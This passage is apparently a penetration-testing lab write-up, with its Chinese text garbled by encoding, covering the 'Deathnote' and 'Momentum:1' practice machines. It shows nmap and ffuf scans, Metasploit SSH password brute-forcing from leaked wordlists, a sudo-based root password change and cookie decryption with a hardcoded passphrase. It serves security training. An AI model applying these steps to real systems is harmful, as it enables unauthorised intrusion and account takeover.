[+] Deleted /tmp/.wefuymefljbi
[*] Meterpreter session 2 opened (127.0.0.1:5555 -> 127.0.0.1:54186) at 2025-03-04 10:22:28 +0000

meterpreter > shell
Process 4624 created.
Channel 1 created.
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```



### Deathnote

Nmap æ‰«æ IP

```
nmap -sP -PR -n -T 5 10.10.10.0/24

address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.101  00:0c:29:77:aa:a8        Linux               4.X    server
```



Nmap æ‰«æ TCP æœåŠ¡

```
db_nmap -sS -sV -n -p- -r -O -T 5 10.10.10.101

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.101  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.101  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



FFUF å·¥å…·ä½¿ç”¨é«˜é¢‘æ–‡ä»¶å­—å…¸è¿›è¡Œæ‰«æï¼Œå‘ç° robots.txt æ–‡ä»¶

```
ffuf -u http://10.10.10.101/FUZZ -w raft-large-files-lowercase.txt

robots.txt              [Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 1ms]
```



è®¿é—® robots.txt é¡µé¢ï¼Œæç¤º /important.jpg è·¯å¾„

```
curl http://10.10.10.101/robots.txt
fuck it my dad 
added hint on /important.jpg

ryuk please delete it
```



è®¿é—® important.jpg é¡µé¢ï¼Œå…¶æ˜¯ä¸€ä¸ª ASCII æ–‡æœ¬æ–‡ä»¶

```
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself 
but i think it is in the hint section of site
```

æç¤ºç”¨æˆ·åå­˜æ”¾åœ¨ **user.txt** ä¸­



FFUF å·¥å…·ä½¿ç”¨ç›®å½•å­—å…¸è¿›è¡Œæ‰«æ

```
ffuf -u http://10.10.10.101/FUZZ -w raft-medium-directories-lowercase.txt

wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
```



è®¿é—® manual é¡µé¢ï¼Œè¿™æ˜¯ apache çš„æ–‡æ¡£ï¼Œæ— å†…å®¹ã€‚

è®¿é—® wordpress é¡µé¢ï¼Œå‘ç°è¯¥ç½‘ç«™æ˜¯ wordpress CMSï¼Œåç«¯æ˜¯ apache + phpã€‚

æ³¨ï¼šè¿™é‡Œå°† 10.10.10.101 å’ŒåŸŸå deathnote.vuln ç»‘å®šï¼Œé€šè¿‡åŸŸåè®¿é—®ç½‘ç«™ï¼Œå¦åˆ™ä¼šå‡ºç°é—®é¢˜ã€‚

![image-20250305095616725](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305095616725.png)



æŸ¥çœ‹ç½‘é¡µå…ƒç´ å‘ç° upload è·¯å¾„

![image-20250305094305755](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305094305755.png)



å°è¯•åœ¨é¶æœºä¸Šè®¿é—®è¯¥è·¯å¾„ï¼Œå‘ç°è¯¥è·¯å¾„å­˜åœ¨ï¼Œå¼€å¯äº† apache çš„ç›®å½•æµè§ˆæ¨¡å¼ï¼Œå­˜åœ¨ user.txt å’Œ notes.txt

![image-20250305095811866](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305095811866.png)



æ ¹æ® user.txt å’Œ notes.txt çŒœæµ‹å¯èƒ½æ˜¯è´¦å·å’Œå¯†ç è¡¨ã€‚

```
user.txt

KIRA
L
ryuk
...
```

```
notes.txt

death4
death4life
death4u
...
```



å°è¯•è¿›è¡Œ ssh ç™»å½•

```
msf6 > use auxiliary/scanner/ssh/ssh_login 

msf6 auxiliary(scanner/ssh/ssh_login) > hosts -R 
RHOSTS => 10.10.10.101

msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE user.txt 
USER_FILE => user.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE notes.txt
PASS_FILE => notes.txt

msf6 auxiliary(scanner/ssh/ssh_login) > run 
[*] 10.10.10.101:22 - Starting bruteforce

[+] 10.10.10.101:22 - Success: 'l:death4me' 'uid=1000(l) gid=1000(l) groups=1000(l),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth) Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux '
[*] SSH session 1 opened (10.10.10.10:36185 -> 10.10.10.101:22) at 2025-03-05 02:12:59 +0000
uname -a 
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux
```



æŸ¥æ‰¾ä¸»æœºä¸Šçš„æ–‡ä»¶ï¼Œ/home/l/user.txt æ–‡ä»¶å†…å®¹ä¸º Brainfuck ç¼–ç 

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

```
i think u got the shell , but you wont be able to kill me -kira
```



æ–‡ä»¶ /opt/L/fake-notebook-rule/case.wav å†…å®¹ä¸º 16 è¿›åˆ¶

```
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```



æ–‡ä»¶ /opt/L/fake-notebook-rule/hint æç¤ºä½¿ç”¨ cyberchef è¿›è¡Œè§£ç 

```
use cyberchef
```



ä½¿ç”¨ cyberchef çš„é­”æ³•åŠŸèƒ½è¿›è¡Œç¼–ç è¯†åˆ«ï¼Œå¯†ç ä¸º **kiraisevil**

![image-20250305125832566](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305125832566.png)

![image-20250305125843254](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305125843254-1741150724551-5.png)



åˆ‡æ¢åˆ° kira ç”¨æˆ·ï¼Œç™»å½•æˆåŠŸ

```
l@deathnote:/etc/apache2$ su kira
Password: 
kira@deathnote:/etc/apache2$ 
```



æŸ¥çœ‹ kira ç”¨æˆ·çš„ sudo æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤

```
kira@deathnote:/etc/apache2$ sudo -l 
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```



ä¿®æ”¹ root ç”¨æˆ·å¯†ç 

```
kira@deathnote:/etc/apache2$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
```



åˆ‡æ¢åˆ° root ç”¨æˆ·

```
kira@deathnote:/etc/apache2$ su root
Password: 
root@deathnote:/etc/apache2# 
```



### Momentumï¼š1

Nmap æ‰«æç«¯å£

```
db_nmap -sS -sV -p- -r -n -O -T 5 10.10.10.102
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.102  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.102  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



é€šè¿‡æµè§ˆå™¨è®¿é—®ç½‘ç«™ï¼Œä½¿ç”¨ Wappalyzer è¯†åˆ«ç½‘ç«™ä½¿ç”¨äº† PHP è¯­è¨€ã€‚

åœ¨æµè§ˆå™¨ä¸­è¿›è¡Œç®€å•äº¤äº’ï¼Œå‘ç°å…¶æ¶‰åŠåˆ°æ•°æ®åº“æŸ¥è¯¢ï¼Œä½†æ˜¯æ­¤å¤„æ—  SQL æ³¨å…¥ã€‚

![image-20250306154124850](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306154124850.png)





ä½¿ç”¨ FFUF å·¥å…·çˆ†ç ´ç½‘ç«™ URL

```
ffuf -u http://10.10.10.102/FUZZ -w raft-large-directories-lowercase.txt
```

```
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 247ms]
img                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 986ms]
:: Progress: [56162/56162] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```



ç»è¿‡æ‰‹å·¥æ£€æŸ¥ manualã€css å’Œ img è·¯å¾„æ­£å¸¸ï¼Œjs è·¯å¾„ä¸‹å­˜åœ¨ main.js æ–‡ä»¶ã€‚

```
curl http://10.10.10.102/js/main.js
```

```
function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```



è¯¥ä»£ç å±äºå…¸å‹çš„AES-CBCæ¨¡å¼è§£å¯†å®ç°ï¼Œé€‚ç”¨äºè§£å¯†é€šè¿‡CryptoJSé»˜è®¤é…ç½®åŠ å¯†çš„æ•°æ®ï¼Œè¿™é‡Œè®¾ç½®äº†å¯†ç ä¸º`SecretPassphraseMomentum` ã€‚

åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°ç½‘ç«™ä¸‹å‘äº†ä¸€ä¸ª cookieï¼Œå°è¯•ä½¿ç”¨æ”¹å¯†ç è¿›è¡Œè§£å¯†ï¼Œè§£å¯†åçš„ç»“æœä¸ºï¼š`auxerre-alienum##` ã€‚

![image-20250306155006262](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306155006262.png)

![image-20250306155028985](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306155028985.png)

è§£å¯†ç½‘ç«™ï¼šhttps://stackblitz.com/edit/cryptojs-aes-encrypt-decrypt?file=index.js



ä½¿ç”¨ node è¿›è¡Œè§£å¯†

```
npm install crypto-js

added 1 package in 2s
```

```
node 

Welcome to Node.js v20.14.0.
Type ".help" for more information.
> var CryptoJS = require("crypto-js");
undefined

> encrypted = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"
'U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt'

> var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
undefined

> console.log(decrypted.toString(CryptoJS.enc.Utf8));
auxerre-alienum##
undefined
```



å°è¯•ä½¿ç”¨çº¿ç´¢ **auxerre-alienum##** é€šè¿‡ ssh è¿›è¡Œç™»å½•ï¼Œæµ‹è¯•å‘ç°ç”¨æˆ·åä¸º **auxerre** ï¼Œå¯†ç ä¸º**åŸå§‹å­—ç¬¦ä¸²ï¼ˆauxerre-alienum##ï¼‰**ã€‚

æŸ¥çœ‹è¿›ç¨‹å‘ç°ä»¥ root ç”¨æˆ·è¿è¡Œ redis è¿›ç¨‹ã€‚

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
redis      519  0.1  0.5  57304 12020 ?        Ssl  02:40   0:31 /usr/bin/redis-server 127.0.0.1:6379
```



ç»è¿‡è¿›ä¸€æ­¥ç ”ç©¶ï¼Œå¯ä»¥è¿æ¥åˆ°å®ƒå¹¶æŸ¥çœ‹å…¶å†…å®¹ï¼Œç»æµ‹è¯•ï¼Œè¯¥å¯†ç ä¸º root å¯†ç ã€‚

![image-20250306160617837](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250306160617837.png)

